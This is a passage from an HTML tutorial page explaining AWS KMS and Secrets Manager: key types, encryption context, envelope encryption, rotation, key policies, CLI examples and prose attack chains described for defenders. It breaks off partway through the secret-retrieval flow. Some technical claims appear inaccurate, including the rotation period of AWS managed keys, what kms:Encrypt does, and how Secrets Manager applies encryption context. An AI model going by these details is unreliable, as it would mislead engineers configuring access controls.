<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AWS KMS & Secrets Manager - Deep Dive</title>
    <link rel="stylesheet" href="appsec-theme.css">
</head>

<body>
    <div class="container">
        <header style="margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 3px solid var(--color-primary);">
            <h1>üîê AWS Key Management Service (KMS) & Secrets Manager</h1>
            <p style="color: var(--text-secondary); font-size: 1.1rem; margin-top: 0.5rem;">
                Master cloud-native secrets management, encryption contexts, and automatic rotation patterns
            </p>
        </header>

        <!-- Section 1: Foundation -->
        <section class="card">
            <div class="card-header">1. Foundation</div>

            <h3>Core Terms & Components</h3>

            <h4>AWS Key Management Service (KMS)</h4>
            <p>
                <strong>AWS KMS</strong> is a managed service that creates and controls the cryptographic keys used to
                encrypt your data.
                It integrates with most AWS services and provides a centralized control point for key management.
            </p>

            <div class="callout callout-info">
                <strong>Core Concept:</strong> KMS manages <em>keys</em>, not secrets. It encrypts/decrypts data using
                those keys,
                but it doesn't store application secrets like database passwords or API tokens. That's where Secrets
                Manager comes in.
            </div>

            <h4>Key Types in AWS KMS</h4>

            <div class="grid grid-2">
                <div>
                    <h5 style="color: var(--color-primary);">Customer Managed Keys (CMKs)</h5>
                    <ul>
                        <li><strong>Full control:</strong> You create, own, and manage these keys</li>
                        <li><strong>Key policies:</strong> You define who can use and manage the key via IAM-like
                            policies</li>
                        <li><strong>Rotation:</strong> You can enable automatic annual rotation</li>
                        <li><strong>Deletion:</strong> Scheduled deletion (7-30 days waiting period)</li>
                        <li><strong>Cost:</strong> $1/month per key + usage charges</li>
                        <li><strong>Use case:</strong> When you need audit trails, custom policies, or cross-account
                            access</li>
                    </ul>
                </div>
                <div>
                    <h5 style="color: var(--color-success);">AWS Managed Keys</h5>
                    <ul>
                        <li><strong>AWS controls:</strong> Created and managed by AWS on your behalf</li>
                        <li><strong>Service-specific:</strong> Named like <code>aws/s3</code>, <code>aws/rds</code>,
                            <code>aws/lambda</code>
                        </li>
                        <li><strong>Rotation:</strong> Automatic rotation every 3 years (you cannot disable)</li>
                        <li><strong>No deletion:</strong> Cannot be deleted by you</li>
                        <li><strong>Cost:</strong> No monthly fee, only usage charges</li>
                        <li><strong>Use case:</strong> Default encryption for AWS services when you don't need custom
                            policies</li>
                    </ul>
                </div>
            </div>

            <div class="callout callout-warning">
                <strong>Important Distinction:</strong> AWS Managed Keys are convenient but limit your control. You
                cannot:
                <ul style="margin-top: 0.5rem; margin-left: 1.5rem;">
                    <li>View or modify the key policy</li>
                    <li>Control rotation schedule</li>
                    <li>Use the key for cross-account access</li>
                    <li>Disable or delete the key</li>
                </ul>
            </div>

            <h4>AWS Owned Keys</h4>
            <p>
                A third category: <strong>AWS Owned Keys</strong> are keys that AWS owns and manages for use across
                multiple AWS accounts.
                You never see these keys, and they're used internally by AWS services. They're free but provide no
                visibility or control.
                <em>We won't focus on these as they're not relevant to application security engineering.</em>
            </p>

            <h4>Encryption Context</h4>
            <p>
                <strong>Encryption context</strong> is a set of key-value pairs that provides <em>additional
                    authenticated data (AAD)</em>
                for encryption operations. Think of it as a "label" or "tag" that:
            </p>
            <ul>
                <li>Must be provided during both encryption AND decryption</li>
                <li>Is cryptographically bound to the ciphertext (authenticated but not encrypted)</li>
                <li>Appears in CloudTrail logs for audit purposes</li>
                <li>Enables fine-grained access control through key policies</li>
            </ul>

            <div class="alert alert-info">
                <strong>Example:</strong> When encrypting data for a specific tenant, you might use encryption context
                like
                <code>{"tenant_id": "acme-corp", "data_classification": "pii"}</code>. This ensures the ciphertext can
                only
                be decrypted when the same context is provided.
            </div>

            <h4>AWS Secrets Manager</h4>
            <p>
                <strong>AWS Secrets Manager</strong> is a managed service for storing, retrieving, and rotating secrets
                such as:
            </p>
            <ul>
                <li>Database credentials</li>
                <li>API keys and tokens</li>
                <li>OAuth client secrets</li>
                <li>SSH keys</li>
                <li>Any sensitive text or binary data</li>
            </ul>

            <p>It provides:</p>
            <ul>
                <li><strong>Encryption at rest:</strong> All secrets encrypted with KMS</li>
                <li><strong>Automatic rotation:</strong> Built-in support for RDS, DocumentDB, Redshift</li>
                <li><strong>Versioning:</strong> Multiple versions of a secret with staging labels</li>
                <li><strong>IAM integration:</strong> Fine-grained access control</li>
                <li><strong>Audit logging:</strong> CloudTrail tracks all API calls</li>
            </ul>

            <h4>Key Components in Secrets Manager</h4>

            <div class="grid grid-3">
                <div>
                    <h5>Secret</h5>
                    <p style="font-size: 0.9rem;">
                        The actual sensitive data (e.g., database password). Stored as JSON or plaintext.
                        Maximum size: 65KB.
                    </p>
                </div>
                <div>
                    <h5>Version</h5>
                    <p style="font-size: 0.9rem;">
                        Each update creates a new version. Versions have staging labels like
                        <code>AWSCURRENT</code>, <code>AWSPENDING</code>, <code>AWSPREVIOUS</code>.
                    </p>
                </div>
                <div>
                    <h5>Rotation Lambda</h5>
                    <p style="font-size: 0.9rem;">
                        A Lambda function that implements the rotation logic: create new secret, update service,
                        verify, finalize.
                    </p>
                </div>
            </div>

            <h4>Rotation Staging Labels</h4>
            <p>Secrets Manager uses staging labels to manage the rotation lifecycle:</p>
            <ul>
                <li><code>AWSCURRENT</code>: The current, active secret version that applications should use</li>
                <li><code>AWSPENDING</code>: The new secret being prepared during rotation (not yet active)</li>
                <li><code>AWSPREVIOUS</code>: The previous secret version (useful for rollback or backward
                    compatibility)</li>
            </ul>

            <h3>How These Components Relate in a Real System</h3>

            <div class="callout callout-success">
                <strong>The Big Picture:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>A <strong>Customer Managed KMS Key</strong> is created with a key policy that grants your
                        application's IAM role <code>kms:Decrypt</code></li>
                    <li>A <strong>secret</strong> (e.g., PostgreSQL password) is created in <strong>Secrets
                            Manager</strong>, encrypted with that KMS key</li>
                    <li>Your Lambda function or ECS task retrieves the secret via Secrets Manager API, which decrypts it
                        using KMS</li>
                    <li>Secrets Manager automatically rotates the secret every 30 days using a <strong>rotation Lambda
                            function</strong></li>
                    <li><strong>Encryption context</strong> (e.g.,
                        <code>{"environment": "production", "app": "api-server"}</code>) ensures only authorized
                        services can decrypt
                    </li>
                    <li><strong>CloudTrail</strong> logs every KMS and Secrets Manager API call, enabling detective
                        controls</li>
                </ol>
            </div>

            <h3>Prerequisites Recap</h3>
            <p>To fully understand this topic, you should be familiar with:</p>
            <ul>
                <li><strong>IAM policies:</strong> Resource-based vs identity-based policies, effect/action/resource
                    structure</li>
                <li><strong>Symmetric vs asymmetric encryption:</strong> KMS primarily uses symmetric encryption
                    (AES-256-GCM)</li>
                <li><strong>Envelope encryption:</strong> KMS encrypts data keys, which encrypt actual data (we'll
                    detail this in Section 4)</li>
                <li><strong>AWS Lambda basics:</strong> Execution role, environment variables, VPC networking</li>
                <li><strong>CloudTrail:</strong> How to read and analyze AWS API logs</li>
            </ul>

            <div class="alert alert-warning">
                <strong>Note:</strong> If envelope encryption is unfamiliar, don't worry‚Äîwe'll build the intuition in
                the next section
                and explain the mechanics step-by-step in Section 4.
            </div>
        </section>

        <!-- Section 2: Intuitive Hook -->
        <section class="card">
            <div class="card-header">2. Intuitive Hook</div>

            <h3>The Hotel Safe Analogy</h3>

            <p>
                Imagine you're staying at a hotel with valuable items. The hotel provides a safe in your room, but
                there's a
                <strong>master key system</strong> for emergencies and maintenance.
            </p>

            <div class="grid grid-2">
                <div class="callout callout-info">
                    <h4>üè® Traditional Hotel Safe (AWS Managed Key)</h4>
                    <ul style="margin-left: 1.5rem; font-size: 0.95rem;">
                        <li><strong>Convenience:</strong> Pre-installed, ready to use</li>
                        <li><strong>Hotel controls master key:</strong> You can't change who has access</li>
                        <li><strong>Standard lock:</strong> Rotated on hotel's schedule, not yours</li>
                        <li><strong>No audit trail:</strong> You don't know when hotel staff accessed it</li>
                        <li><strong>Cost:</strong> Included in room price (no extra charge)</li>
                    </ul>
                    <p style="margin-top: 0.5rem; font-style: italic; font-size: 0.9rem;">
                        <strong>Analogy:</strong> AWS Managed Keys are like the hotel's standard safe. Convenient, but
                        limited control.
                    </p>
                </div>

                <div class="callout callout-success">
                    <h4>üîê Your Own Portable Safe (Customer Managed Key)</h4>
                    <ul style="margin-left: 1.5rem; font-size: 0.95rem;">
                        <li><strong>Full control:</strong> You choose the lock, combination, and who gets keys</li>
                        <li><strong>Custom access rules:</strong> Only you and trusted people have the combination</li>
                        <li><strong>Audit log:</strong> A camera records every time someone opens it</li>
                        <li><strong>Rotation:</strong> You change the combination when you want</li>
                        <li><strong>Cost:</strong> You pay for the safe and maintenance</li>
                    </ul>
                    <p style="margin-top: 0.5rem; font-style: italic; font-size: 0.9rem;">
                        <strong>Analogy:</strong> Customer Managed Keys give you full ownership and visibility.
                    </p>
                </div>
            </div>

            <h3>The Envelope Encryption Twist</h3>

            <div class="callout callout-warning">
                <strong>The Problem:</strong> Your safe (KMS key) is in the hotel's secure vault (AWS-managed HSM). You
                can't physically
                take it with you, and it's too slow to open it every time you need to access your valuables.
            </div>

            <div class="callout callout-success">
                <strong>The Solution - Envelope Encryption:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>The hotel vault (KMS) creates a <strong>data key</strong>‚Äîa smaller, temporary key</li>
                    <li>You use this data key to encrypt your valuables (application data) in your room</li>
                    <li>The hotel vault encrypts this data key with the master key and gives you both:
                        <ul style="margin-left: 1.5rem;">
                            <li><strong>Plaintext data key</strong> (use immediately, then discard)</li>
                            <li><strong>Encrypted data key</strong> (store with your encrypted valuables)</li>
                        </ul>
                    </li>
                    <li>Later, when you need your valuables, the hotel vault decrypts the data key, and you decrypt your
                        data</li>
                </ol>
            </div>

            <p><strong>Why this matters:</strong></p>
            <ul>
                <li><strong>Performance:</strong> KMS doesn't need to encrypt/decrypt large data (only small keys)</li>
                <li><strong>Scalability:</strong> You can encrypt gigabytes of data without hitting KMS API limits</li>
                <li><strong>Portability:</strong> Encrypted data + encrypted data key can be stored anywhere (S3, RDS,
                    etc.)</li>
            </ul>

            <h3>Secrets Manager: The Hotel Concierge</h3>

            <p>
                Now imagine the hotel has a <strong>concierge service</strong> (Secrets Manager) that:
            </p>
            <ul>
                <li><strong>Stores your safe combination</strong> in an encrypted notebook (using KMS)</li>
                <li><strong>Changes the combination regularly</strong> (automatic rotation) without you lifting a finger
                </li>
                <li><strong>Tells you the new combination</strong> when you call the front desk (API call)</li>
                <li><strong>Keeps a log</strong> of every time someone asked for the combination (CloudTrail audit)</li>
            </ul>

            <div class="alert alert-info">
                <strong>Key Insight:</strong> KMS is the encryption engine (the vault). Secrets Manager is the secrets
                lifecycle manager
                (the concierge). They work together: Secrets Manager uses KMS keys to encrypt secrets, and can
                automatically rotate
                them by calling backend services (like RDS) to update passwords.
            </div>

            <h3>Encryption Context: The Room Number Check</h3>

            <p>
                When you ask the concierge for your safe combination, they ask: <strong>"What's your room
                    number?"</strong>
                This is the <strong>encryption context</strong>.
            </p>

            <ul>
                <li>If you provide the wrong room number, they won't give you the combination (decryption fails)</li>
                <li>This prevents someone from stealing your encrypted notebook and decrypting it elsewhere</li>
                <li>The hotel's security log shows your room number every time you requested the combination (audit
                    trail)</li>
            </ul>

            <div class="callout callout-danger">
                <strong>Security Principle:</strong> Encryption context binds the ciphertext to a specific context.
                Even if an attacker has <code>kms:Decrypt</code> permissions, they can't decrypt your data without
                providing the correct context (e.g., tenant ID, environment, application name).
            </div>
        </section>

        <!-- Section 3: Mental Model -->
        <section class="card">
            <div class="card-header">3. Mental Model ‚Äî "Why ‚Üí How ‚Üí What-If"</div>

            <h3>üü¢ The Healthy Baseline (Trusted, Secure System)</h3>

            <div class="callout callout-success">
                <strong>Ideal Scenario:</strong> Multi-tenant SaaS application with strong secrets hygiene

                <div style="margin-top: 1rem; background: var(--bg-tertiary); padding: 1rem; border-radius: 0.5rem;">
                    <h4 style="margin-top: 0;">Architecture:</h4>
                    <ul style="margin-left: 1.5rem;">
                        <li><strong>KMS Setup:</strong> Customer Managed Key (CMK) with least-privilege key policy</li>
                        <li><strong>Encryption Context:</strong> All encrypt/decrypt calls include
                            <code>{"tenant_id": "...", "environment": "prod"}</code>
                        </li>
                        <li><strong>Secrets Manager:</strong> Database credentials stored per environment, automatic
                            30-day rotation</li>
                        <li><strong>IAM:</strong> Service roles have <code>kms:Decrypt</code> +
                            <code>secretsmanager:GetSecretValue</code> scoped to specific resources
                        </li>
                        <li><strong>Rotation:</strong> Lambda rotation function updates RDS master password, verifies
                            connectivity, promotes to <code>AWSCURRENT</code></li>
                        <li><strong>Audit:</strong> CloudTrail logs every API call; alerts on unusual patterns (e.g.,
                            decrypt calls from unknown IP)</li>
                    </ul>
                </div>
            </div>

            <h4>Expected Behavior:</h4>
            <ul>
                <li>Application retrieves database password from Secrets Manager on startup</li>
                <li>Secrets Manager decrypts the secret using KMS with encryption context validation</li>
                <li>Database connection succeeds; application caches the secret in memory (not on disk)</li>
                <li>Every 30 days, rotation Lambda creates new password, updates RDS, verifies, and promotes</li>
                <li>Application automatically picks up new secret on next retrieval (either via polling or event-driven)
                </li>
                <li>Old password version remains available for 24-48 hours (grace period for rolling deployments)</li>
            </ul>

            <h3>üîµ Why It Matters in Security</h3>

            <h4>Confidentiality</h4>
            <ul>
                <li><strong>Secrets never in code:</strong> No hardcoded passwords in repositories or container images
                </li>
                <li><strong>Encrypted at rest:</strong> KMS ensures secrets are encrypted in Secrets Manager and
                    downstream services</li>
                <li><strong>Encrypted in transit:</strong> TLS for all API calls; keys never transmitted in plaintext
                </li>
                <li><strong>Least privilege:</strong> Encryption context prevents lateral movement (attacker can't
                    decrypt Tenant A's data with Tenant B's context)</li>
            </ul>

            <h4>Integrity</h4>
            <ul>
                <li><strong>Authenticated encryption:</strong> KMS uses AES-256-GCM, which provides integrity (tampering
                    detected)</li>
                <li><strong>Encryption context binding:</strong> Ciphertext cryptographically bound to context;
                    modification detected</li>
                <li><strong>Version control:</strong> Secrets Manager versioning prevents accidental overwrites;
                    rollback possible</li>
            </ul>

            <h4>Availability</h4>
            <ul>
                <li><strong>Automatic rotation:</strong> Reduces risk of long-lived credentials being compromised</li>
                <li><strong>Zero-downtime rotation:</strong> Staging labels enable gradual rollout without service
                    disruption</li>
                <li><strong>Regional redundancy:</strong> KMS and Secrets Manager are highly available within a region
                </li>
            </ul>

            <h4>Abuse Prevention</h4>
            <ul>
                <li><strong>Audit trail:</strong> Every decrypt, encrypt, and secret retrieval logged in CloudTrail</li>
                <li><strong>Alerting:</strong> Anomaly detection on KMS usage (e.g., unusual volume, new IAM principal)
                </li>
                <li><strong>Key policy:</strong> Explicit deny rules can block even root account from using keys</li>
            </ul>

            <h3>üü° How It Actually Works (Real-World Multi-Tenant SaaS)</h3>

            <div class="callout callout-info">
                <strong>Scenario:</strong> A SaaS platform with 1,000+ tenants, each with isolated PostgreSQL database
            </div>

            <h4>Architecture Flow:</h4>

            <ol style="margin-left: 1.5rem;">
                <li>
                    <strong>Initial Setup (Infrastructure Team):</strong>
                    <ul style="margin-left: 1.5rem;">
                        <li>Create CMK in KMS with key policy allowing
                            <code>arn:aws:iam::123456789012:role/app-prod-backend</code>
                        </li>
                        <li>Enable automatic key rotation (KMS rotates key material every year, old material retained
                            for decryption)</li>
                        <li>Create Secrets Manager secret: <code>prod/rds/tenant-{tenant_id}/master</code></li>
                        <li>Store initial PostgreSQL password in secret, encrypted with CMK</li>
                        <li>Configure rotation: Lambda function + 30-day schedule</li>
                    </ul>
                </li>

                <li>
                    <strong>Application Startup (Backend Service):</strong>
                    <ul style="margin-left: 1.5rem;">
                        <li>Backend assumes <code>app-prod-backend</code> role via EC2 instance profile or ECS task role
                        </li>
                        <li>Calls <code>secretsmanager:GetSecretValue</code> with secret ARN</li>
                        <li>Secrets Manager calls <code>kms:Decrypt</code> with encryption context:
                            <code>{"tenant_id": "acme-corp", "environment": "production"}</code>
                        </li>
                        <li>KMS validates encryption context, decrypts the secret, returns plaintext to Secrets Manager
                        </li>
                        <li>Secrets Manager returns plaintext secret to application</li>
                        <li>Application caches password in memory (never logs or writes to disk)</li>
                    </ul>
                </li>

                <li>
                    <strong>Automatic Rotation (Every 30 Days):</strong>
                    <ul style="margin-left: 1.5rem;">
                        <li>Secrets Manager triggers rotation Lambda via EventBridge</li>
                        <li><strong>createSecret:</strong> Lambda generates new strong password, stores in secret with
                            <code>AWSPENDING</code> label
                        </li>
                        <li><strong>setSecret:</strong> Lambda connects to RDS, changes master password via SQL:
                            <code>ALTER USER master WITH PASSWORD 'new_password';</code>
                        </li>
                        <li><strong>testSecret:</strong> Lambda tests connectivity with new password</li>
                        <li><strong>finishSecret:</strong> Moves <code>AWSCURRENT</code> to <code>AWSPREVIOUS</code>,
                            promotes <code>AWSPENDING</code> to <code>AWSCURRENT</code></li>
                        <li>Applications fetch updated secret on next retrieval (or via cache expiry/event notification)
                        </li>
                    </ul>
                </li>

                <li>
                    <strong>Tenant Isolation (Encryption Context Enforcement):</strong>
                    <ul style="margin-left: 1.5rem;">
                        <li>Key policy includes condition:
                            <code>"kms:EncryptionContext:tenant_id": "${aws:PrincipalTag/tenant_id}"</code>
                        </li>
                        <li>Application's IAM role has tag: <code>tenant_id = acme-corp</code></li>
                        <li>Even if attacker steals role credentials, they cannot decrypt
                            <code>tenant_id = globex-inc</code> secrets
                        </li>
                    </ul>
                </li>
            </ol>

            <h4>Cross-Service Interactions:</h4>
            <ul>
                <li><strong>RDS:</strong> Encrypted at rest using KMS; master password rotated by Secrets Manager</li>
                <li><strong>Lambda:</strong> Rotation function has IAM role with
                    <code>secretsmanager:PutSecretValue</code> + <code>rds:ModifyDBInstance</code>
                </li>
                <li><strong>CloudWatch:</strong> Rotation Lambda logs success/failure; alerts on
                    <code>RotationFailed</code> metric
                </li>
                <li><strong>VPC:</strong> Rotation Lambda runs in private subnet with VPC endpoint to Secrets Manager
                    (no internet access)</li>
            </ul>

            <h3>üî¥ What-If It Fails or Is Ignored</h3>

            <h4>Failure Mode 1: No Encryption Context</h4>
            <div class="alert alert-danger">
                <strong>Problem:</strong> Application calls <code>kms:Decrypt</code> without encryption context
                <br><strong>Impact:</strong> Attacker who compromises any service with <code>kms:Decrypt</code> can
                decrypt ALL secrets, regardless of tenant
                <br><strong>Blast Radius:</strong> Complete tenant isolation bypass; horizontal privilege escalation
                <br><strong>Attack Chain:</strong> SSRF in web app ‚Üí steal EC2 metadata credentials ‚Üí decrypt all tenant
                secrets ‚Üí access all databases
            </div>

            <h4>Failure Mode 2: AWS Managed Key for Sensitive Secrets</h4>
            <div class="alert alert-danger">
                <strong>Problem:</strong> Using <code>aws/secretsmanager</code> key instead of CMK
                <br><strong>Impact:</strong> No encryption context support; cannot enforce tenant-specific key policies;
                limited audit visibility
                <br><strong>Blast Radius:</strong> Compliance violation (cannot prove least privilege); difficult to
                revoke access granularly
                <br><strong>Real-World Example:</strong> During incident response, cannot quickly revoke specific
                application's access without affecting all services
            </div>

            <h4>Failure Mode 3: No Automatic Rotation</h4>
            <div class="alert alert-danger">
                <strong>Problem:</strong> Secrets stored but never rotated
                <br><strong>Impact:</strong> Long-lived credentials; compromised secrets remain valid indefinitely
                <br><strong>Blast Radius:</strong> If secret leaked (e.g., in logs, committed to repo), attacker has
                persistent access
                <br><strong>Attack Chain:</strong> Developer accidentally commits secret to GitHub ‚Üí attacker finds it
                via automated scanning ‚Üí maintains access for months
            </div>

            <h4>Failure Mode 4: Overly Permissive Key Policy</h4>
            <div class="alert alert-danger">
                <strong>Problem:</strong> Key policy allows <code>kms:Decrypt</code> for <code>"*"</code> (all
                principals)
                <br><strong>Impact:</strong> Any IAM principal in account can decrypt secrets; least privilege violated
                <br><strong>Blast Radius:</strong> Compromised developer laptop ‚Üí steal temporary credentials ‚Üí decrypt
                production secrets
                <br><strong>Attack Chain:</strong> Phishing ‚Üí developer's AWS CLI credentials stolen ‚Üí attacker decrypts
                all KMS-encrypted data
            </div>

            <h4>Failure Mode 5: Rotation Lambda Misconfiguration</h4>
            <div class="alert alert-danger">
                <strong>Problem:</strong> Rotation Lambda has internet access or overly broad IAM permissions
                <br><strong>Impact:</strong> Attacker who compromises Lambda can exfiltrate secrets or modify rotation
                logic
                <br><strong>Blast Radius:</strong> Persistent backdoor; attacker rotates secret to known value
                <br><strong>Attack Chain:</strong> Vulnerable npm package in Lambda dependencies ‚Üí RCE ‚Üí exfiltrate
                secrets via HTTP
            </div>

            <h4>Chaining with Other Issues</h4>
            <div class="callout callout-danger">
                <strong>Realistic Multi-Step Attack:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li><strong>SSRF in web application</strong> ‚Üí Access EC2 metadata service</li>
                    <li><strong>Steal IAM temporary credentials</strong> from metadata</li>
                    <li><strong>No encryption context enforcement</strong> ‚Üí Use stolen credentials to call
                        <code>kms:Decrypt</code>
                    </li>
                    <li><strong>Decrypt secrets for all tenants</strong> (horizontal privilege escalation)</li>
                    <li><strong>No rotation</strong> ‚Üí Maintain persistent access even after SSRF is patched</li>
                    <li><strong>Weak CloudTrail alerting</strong> ‚Üí Attack goes undetected for weeks</li>
                </ol>
            </div>

            <h4>Typical Misconfigurations (What AppSec Reviewers See)</h4>
            <ul>
                <li><strong>"We use Secrets Manager, so we're secure"</strong> ‚Äî but using AWS managed key with no
                    encryption context</li>
                <li><strong>Secrets stored in Parameter Store</strong> instead of Secrets Manager (no automatic
                    rotation)</li>
                <li><strong>Hardcoded KMS key IDs in code</strong> instead of using aliases or tags</li>
                <li><strong>Rotation enabled but never tested</strong> ‚Äî rotation fails silently, old password continues
                    working</li>
                <li><strong>Application retrieves secret once at startup</strong> ‚Äî never picks up rotated secret until
                    restart (outage after rotation)</li>
            </ul>
        </section>

        <!-- Section 4: Deep Explanation -->
        <section class="card">
            <div class="card-header">4. Deep Explanation (Step-by-Step)</div>

            <h3>Part A: KMS Key Operations - The Complete Flow</h3>

            <h4>Creating a Customer Managed Key (CMK)</h4>

            <div class="callout callout-info">
                <strong>Step 1: Key Material Generation</strong>
                <p>When you create a CMK, AWS KMS generates key material in a FIPS 140-2 Level 2 validated Hardware
                    Security Module (HSM).</p>
            </div>

            <pre><code># AWS CLI example
aws kms create-key \
  --description "Production application encryption key" \
  --key-usage ENCRYPT_DECRYPT \
  --origin AWS_KMS

# Returns key metadata including KeyId (UUID)</code></pre>

            <p><strong>Key properties created:</strong></p>
            <ul>
                <li><strong>KeyId:</strong> Unique identifier (e.g., <code>1234abcd-12ab-34cd-56ef-1234567890ab</code>)
                </li>
                <li><strong>KeyState:</strong> Enabled (ready for use)</li>
                <li><strong>KeyUsage:</strong> ENCRYPT_DECRYPT (symmetric) or SIGN_VERIFY (asymmetric)</li>
                <li><strong>Origin:</strong> AWS_KMS (AWS generates key material) vs EXTERNAL (you import your own)</li>
            </ul>

            <div class="callout callout-warning">
                <strong>Important:</strong> The actual key material (the 256-bit AES key) <strong>never leaves the
                    HSM</strong>.
                All encrypt/decrypt operations happen inside the HSM. You never see or export the raw key.
            </div>

            <h4>Step 2: Key Policy Attachment</h4>

            <p>Every CMK requires a <strong>key policy</strong> (resource-based policy). This is different from IAM
                policies:</p>

            <div class="grid grid-2">
                <div>
                    <h5>Key Policy (Resource-Based)</h5>
                    <ul style="font-size: 0.9rem;">
                        <li>Attached to the KMS key itself</li>
                        <li>Required; every key must have one</li>
                        <li>Can grant cross-account access</li>
                        <li>Takes precedence over IAM policies</li>
                        <li>Can include conditions on encryption context</li>
                    </ul>
                </div>
                <div>
                    <h5>IAM Policy (Identity-Based)</h5>
                    <ul style="font-size: 0.9rem;">
                        <li>Attached to IAM users/roles</li>
                        <li>Optional; depends on key policy allowing it</li>
                        <li>Cannot grant cross-account access alone</li>
                        <li>Works only if key policy allows IAM</li>
                        <li>Can further restrict permissions</li>
                    </ul>
                </div>
            </div>

            <pre><code>{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "Enable IAM User Permissions",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:root"
      },
      "Action": "kms:*",
      "Resource": "*"
    },
    {
      "Sid": "Allow application role to decrypt",
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::123456789012:role/app-prod-backend"
      },
      "Action": [
        "kms:Decrypt",
        "kms:DescribeKey"
      ],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "kms:EncryptionContext:environment": "production",
          "kms:EncryptionContext:tenant_id": "${aws:PrincipalTag/tenant_id}"
        }
      }
    }
  ]
}</code></pre>

            <div class="alert alert-warning">
                <strong>Tricky Edge Case:</strong> If you forget the first statement (allowing IAM root), the key policy
                locks out everyone‚Äîeven account administrators cannot manage the key through IAM policies alone. You'd
                need
                to contact AWS Support to regain access.
            </div>

            <h4>Step 3: Encryption Context Deep Dive</h4>

            <p><strong>What is encryption context technically?</strong></p>
            <ul>
                <li>A set of key-value pairs (e.g., <code>{"tenant_id": "acme", "env": "prod"}</code>)</li>
                <li>Passed as <strong>Additional Authenticated Data (AAD)</strong> to the AES-GCM algorithm</li>
                <li>The context is hashed and bound to the ciphertext during encryption</li>
                <li>The exact same context must be provided during decryption, or the operation fails</li>
                <li>The context itself is <strong>NOT encrypted</strong>‚Äîit's authenticated but visible in logs</li>
            </ul>

            <div class="callout callout-danger">
                <strong>Common Misconception:</strong> Encryption context does NOT hide the metadata. Don't put
                sensitive
                values like passwords or PII in the context. Use it for <em>non-sensitive identifiers</em> like tenant
                IDs,
                environment names, or resource ARNs.
            </div>

            <h4>Encryption Context Validation Flow</h4>

            <pre><code>1. Application calls kms:Encrypt:
   - Plaintext: "super-secret-password"
   - EncryptionContext: {"tenant_id": "acme-corp", "env": "production"}

2. KMS performs:
   - Generates random data key (256-bit)
   - Encrypts plaintext with data key using AES-256-GCM
   - Binds encryption context to ciphertext (AAD in GCM mode)
   - Encrypts data key with CMK
   - Returns: CiphertextBlob + metadata (including context hash)

3. Later, application calls kms:Decrypt:
   - CiphertextBlob: (encrypted data)
   - EncryptionContext: {"tenant_id": "acme-corp", "env": "production"}

4. KMS validates:
   - Decrypts data key with CMK
   - Verifies encryption context matches authenticated data
   - If context mismatches: InvalidCiphertextException
   - If context matches: Returns plaintext

5. If attacker tries wrong context:
   kms:Decrypt with {"tenant_id": "evil-corp", "env": "production"}
   ‚Üí KMS returns: InvalidCiphertextException (cannot decrypt)</code></pre>

            <h4>Types of KMS Keys (Complete Taxonomy)</h4>

            <div class="grid grid-3">
                <div>
                    <h5>By Management</h5>
                    <ul style="font-size: 0.85rem;">
                        <li><strong>Customer Managed:</strong> You control</li>
                        <li><strong>AWS Managed:</strong> AWS controls</li>
                        <li><strong>AWS Owned:</strong> AWS internal</li>
                    </ul>
                </div>
                <div>
                    <h5>By Key Material Origin</h5>
                    <ul style="font-size: 0.85rem;">
                        <li><strong>AWS_KMS:</strong> AWS generates</li>
                        <li><strong>EXTERNAL:</strong> You import</li>
                        <li><strong>AWS_CLOUDHSM:</strong> CloudHSM cluster</li>
                    </ul>
                </div>
                <div>
                    <h5>By Key Usage</h5>
                    <ul style="font-size: 0.85rem;">
                        <li><strong>ENCRYPT_DECRYPT:</strong> Symmetric (AES-256)</li>
                        <li><strong>SIGN_VERIFY:</strong> Asymmetric (RSA/ECC)</li>
                    </ul>
                </div>
            </div>

            <h4>Automatic Key Rotation Mechanics</h4>

            <p>When you enable automatic rotation for a CMK:</p>

            <ol style="margin-left: 1.5rem;">
                <li><strong>Every 365 days:</strong> KMS generates new key material (new 256-bit AES key)</li>
                <li><strong>Key ID stays the same:</strong> ARN and KeyId do not change</li>
                <li><strong>Old material retained:</strong> Previous key materials are kept for decryption of existing
                    ciphertext</li>
                <li><strong>New encryptions use new material:</strong> All new encrypt operations use the latest key
                    material</li>
                <li><strong>Automatic decryption:</strong> KMS knows which key material was used to encrypt data and
                    uses the correct one</li>
            </ol>

            <div class="callout callout-success">
                <strong>Why This Design?</strong> You don't need to re-encrypt existing data. Old ciphertexts remain
                valid and
                decryptable. Only new data uses the new key material. This makes rotation zero-downtime and transparent.
            </div>

            <div class="alert alert-warning">
                <strong>Limitation:</strong> Automatic rotation does NOT work for:
                <ul style="margin-left: 1.5rem;">
                    <li>Asymmetric keys (SIGN_VERIFY)</li>
                    <li>Keys with imported key material (EXTERNAL origin)</li>
                    <li>Keys in custom key stores (CloudHSM)</li>
                </ul>
                For these, you must implement manual rotation.
            </div>

            <h3>Part B: Secrets Manager - Complete Lifecycle</h3>

            <h4>Secret Creation and Structure</h4>

            <pre><code># Create a secret
aws secretsmanager create-secret \
  --name prod/db/postgres/master \
  --description "Production PostgreSQL master password" \
  --kms-key-id arn:aws:kms:us-east-1:123456789012:key/abc123 \
  --secret-string '{"username":"admin","password":"ComplexP@ssw0rd123!"}'

# Returns:
{
  "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/db/postgres/master-AbCdEf",
  "Name": "prod/db/postgres/master",
  "VersionId": "EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE"
}</code></pre>

            <p><strong>Internal Structure:</strong></p>
            <ul>
                <li><strong>SecretString:</strong> Text data (JSON, plaintext, etc.) - max 65KB</li>
                <li><strong>SecretBinary:</strong> Binary data (for non-text secrets like certificates) - max 65KB</li>
                <li><strong>VersionId:</strong> Unique ID for each secret version (UUID)</li>
                <li><strong>VersionStages:</strong> Labels attached to versions (AWSCURRENT, AWSPENDING, etc.)</li>
                <li><strong>KMS Key:</strong> Which CMK encrypts this secret</li>
            </ul>

            <h4>Secret Retrieval Flow (Step-by-Step)</h4>

            <pre><code>1. Application makes API call:
   GetSecretValue(SecretId="prod/db/postgres/master")

